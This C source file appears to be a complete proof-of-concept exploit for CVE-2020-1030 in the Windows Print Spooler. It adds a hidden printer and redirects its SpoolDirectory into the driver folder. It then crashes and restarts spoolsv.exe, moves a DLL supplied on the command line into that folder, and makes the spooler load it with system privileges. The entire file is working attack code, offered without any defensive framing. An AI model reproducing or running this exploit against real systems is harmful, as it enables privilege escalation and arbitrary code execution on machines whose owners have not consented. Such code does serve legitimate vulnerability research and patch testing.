#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int 
ThreadSpoolerSvc(LPVOID pProcessName)
{
    HANDLE hSnapshot;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    while (TRUE)
    {
        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (!Process32First(hSnapshot, &entry))
        {
            CloseHandle(hSnapshot);
            return -1;
        }

        do
        {
            if (!_wcsicmp(entry.szExeFile, (LPWSTR)pProcessName))
            {
                CloseHandle(hSnapshot);
                return 0;
            }
        }
        while (Process32Next(hSnapshot, &entry));

        CloseHandle(hSnapshot);
        Sleep(1000);
    }

    return -1;
}

int
ThreadSpoolerDir(LPVOID pDirectory)
{
    HANDLE hChange;
    DWORD dwWaitStatus;
    DWORD dwAttributes;
    DWORD dwIndex;
    WCHAR szParentDir[MAX_PATH];

    dwIndex = (DWORD)(wcsrchr((LPWSTR)pDirectory, L'\\') - (LPWSTR)pDirectory);
    wcsncpy_s(szParentDir, MAX_PATH, (LPWSTR)pDirectory, dwIndex);

    hChange = FindFirstChangeNotification(szParentDir, FALSE, FILE_NOTIFY_CHANGE_DIR_NAME);

    if (hChange == INVALID_HANDLE_VALUE || hChange == NULL)
    {
        return -1;
    }

    while (hChange)
    {
        dwWaitStatus = WaitForSingleObject(hChange, INFINITE);

        if (dwWaitStatus == WAIT_OBJECT_0)
        {
            dwAttributes = GetFileAttributes((LPWSTR)pDirectory);
            if (dwAttributes != INVALID_FILE_ATTRIBUTES && (dwAttributes & FILE_ATTRIBUTE_DIRECTORY))
            {
                break;
            }
        }

        if (!FindNextChangeNotification(hChange))
        {
            break;
        }
    }

    if (hChange)
    {
        FindCloseChangeNotification(hChange);
    }

    return 0;
}

int
ThreadSpoolerInit(void)
{
    DWORD cReturned;
    DWORD cbNeeded;
    DWORD dwError;

    for (int i = 1; i <= 30; i++)
    {
        Sleep(1000);

        if (!EnumPrinters(PRINTER_ENUM_LOCAL, NULL, 2, NULL, 0, &cbNeeded, &cReturned))
        {
            dwError = GetLastError();

            if (dwError == RPC_S_SERVER_UNAVAILABLE)
            {
                continue;
            }
        }

        break;
    }

    return 0;
}

int 
main (
    int argc,
    char *argv[]
    )
{
    PRINTER_DEFAULTS printerDefaults;
    PRINTER_INFO_2 printerInfo;
    HANDLE hPrinter;
    HANDLE hThreadSpoolerSvc;
    HANDLE hThreadSpoolerDir;
    HANDLE hThreadSpoolerInit;
    DWORD dwStatus = -1;
    DWORD cbData;
    DWORD dwAttributes;
    WCHAR szDll[MAX_PATH];
    WCHAR szSource[MAX_PATH];
    WCHAR szDestination[MAX_PATH];
    LPWSTR pszFileName;
    LPWSTR pszPrinterName = L"CVE-2020-1030";
    LPWSTR pszDriverPath = L"C:\\Windows\\System32\\spool\\drivers\\x64\\4";
    LPWSTR pszTerminator = L"C:\\Windows\\System32\\AppVTerminator.dll";

    memset(&printerInfo, 0, sizeof(printerInfo));
    printerInfo.pPrinterName = pszPrinterName;
    printerInfo.pDriverName = L"Microsoft Print To PDF";
    printerInfo.pPortName = L"PORTPROMPT:";
    printerInfo.pPrintProcessor = L"winprint";
    printerInfo.pDatatype = L"RAW";
    printerInfo.Attributes = PRINTER_ATTRIBUTE_HIDDEN;

    hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);

    if (hPrinter == NULL)
    {
        printf("Failed: AddPrinter(), %ls. Error: %d\n", pszPrinterName, GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }

    // Set SpoolDirectory to v4 driver directory

    cbData = ((DWORD)wcslen(pszDriverPath) + 1) * sizeof(WCHAR);
    dwStatus = SetPrinterDataEx(hPrinter, L"\\", L"SpoolDirectory", REG_SZ, (LPBYTE)pszDriverPath, cbData);
    
    if (dwStatus != ERROR_SUCCESS)
    {
        printf("Failed: SetPrinterDataEx(), SpoolDirectory. Error: %d\n", GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }

    // Check if AppVTerminator.dll exists

    dwAttributes = GetFileAttributes(pszTerminator);

    if (dwAttributes == INVALID_FILE_ATTRIBUTES)
    {
        printf("Failed: GetFileAttributes(), %ls. Error: %d\n", pszTerminator, GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }

    // Call LoadLibraryEx (localspl!SplLoadLibraryTheCopyFileModule) with AppVTerminator.dll
    // This will immediately terminate spoolsv.exe and SetPrinterDataEx will fail (RPC_S_CALL_FAILED)

    cbData = ((DWORD)wcslen(L"AppVTerminator.dll") + 1) * sizeof(WCHAR);
    dwStatus = SetPrinterDataEx(hPrinter, L"CopyFiles\\Payload", L"Module", REG_SZ, (LPBYTE)L"AppVTerminator.dll", cbData);

    if (dwStatus != RPC_S_CALL_FAILED)
    {
        printf("Failed: SetPrinterDataEx(), %ls. Error: %d\n", L"AppVTerminator.dll", GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }

    // Monitor spoolsv.exe process creation, timeout = 30 seconds

    if ((hThreadSpoolerSvc = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadSpoolerSvc, L"spoolsv.exe", 0, NULL)) == NULL)
    {
        printf("Failed: CreateThread(), ThreadSpoolerSvc. Error: %d\n", GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }

    dwStatus = WaitForSingleObject(hThreadSpoolerSvc, 30000);

    if (dwStatus != WAIT_OBJECT_0)
    {
        printf("Failed: WaitForSingleObject(), hThreadSpoolerSvc. Error: %d\n", GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }

    // Skip spooler initialization if spool directory exists

    dwAttributes = GetFileAttributes(pszDriverPath);

    if (dwAttributes != INVALID_FILE_ATTRIBUTES && (dwAttributes & FILE_ATTRIBUTE_DIRECTORY))
    {
        goto Move;
    }

    // Monitor spool directory creation

    hThreadSpoolerDir = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadSpoolerDir, pszDriverPath, 0, NULL);

    if (hThreadSpoolerDir == NULL)
    {
        printf("Failed: CreateThread(), ThreadSpoolerDir. Error: %d\n", GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }

    // Force spooler initialization by calling localspl!BuildPrinterInfo via EnumPrinters

    hThreadSpoolerInit = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadSpoolerInit, NULL, 0, NULL);

    if (hThreadSpoolerInit == NULL)
    {
        printf("Failed: CreateThread(), ThreadSpoolerInit. Error: %d\n", GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }

    // Wait for spooler directory; timeout = 5 minutes

    dwStatus = WaitForSingleObject(hThreadSpoolerDir, 5 * 60 * 1000);

    if (dwStatus != WAIT_OBJECT_0)
    {
        printf("Warning: WaitForSingleObject(), hThreadSpoolerDir. Error: Timer expired\n");
        ClosePrinter(hPrinter);
        return -1;
    }

Move:
    // Move payload to spool directory

    mbstowcs_s(NULL, szDll, strlen(argv[1]) + 1, argv[1], MAX_PATH);
    GetFullPathName(szDll, MAX_PATH, szSource, &pszFileName);
    wcscpy_s(szDestination, MAX_PATH, pszDriverPath);
    wcscat_s(szDestination, MAX_PATH, L"\\");
    wcscat_s(szDestination, MAX_PATH, pszFileName);

    if (!MoveFile(szSource, szDestination))
    {
        printf("Failed: MoveFile(), Src: %ls, Dst: %ls. Error: %d\n", szSource, szDestination, GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }

    // Get printer handle

    memset(&printerDefaults, 0, sizeof(printerDefaults));
    printerDefaults.DesiredAccess  = PRINTER_ALL_ACCESS;

    if (!OpenPrinter(pszPrinterName, &hPrinter, &printerDefaults))
    {
        printf("Failed: OpenPrinter(), %ls. Error: %d\n", pszPrinterName, GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }

    // Call LoadLibraryEx (localspl!SplLoadLibraryTheCopyFileModule) with our payload

    cbData = ((DWORD)wcslen(szDestination) + 1) * sizeof(WCHAR);
    dwStatus = SetPrinterDataEx(hPrinter, L"CopyFiles\\Payload", L"Module", REG_SZ, (LPBYTE)szDestination, cbData);
    
    if (dwStatus != ERROR_SUCCESS)
    {
        printf("Failed: SetPrinterDataEx(), %ls. Error: %d\n", szDestination, GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }

    ClosePrinter(hPrinter);

    return 0;
}
